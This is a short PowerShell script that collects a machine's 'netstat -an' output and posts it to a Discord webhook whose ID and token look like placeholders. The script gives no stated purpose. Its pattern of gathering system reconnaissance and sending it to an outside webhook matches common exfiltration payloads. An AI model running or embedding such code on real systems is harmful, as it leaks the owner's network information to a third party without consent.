# Define the webhook URL
$discordWebhook = "https://discordapp.com/api/webhooks/1234567890/abcdefghijklmno"

# Gather the netstat output
$netstatOutput = netstat -an

# Send the netstat output to the Discord webhook as a message
$body = @{
    content = "Netstat Data:"
    embeds = @(
        @{
            title = "Netstat Output"
            description = $netstatOutput
            color = 16711680  # Red color for the embed
        }
    )
}

# Convert the body to JSON and send it via a POST request to Discord
$bodyJson = $body | ConvertTo-Json -Depth 10
Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType 'application/json' -Body $bodyJson
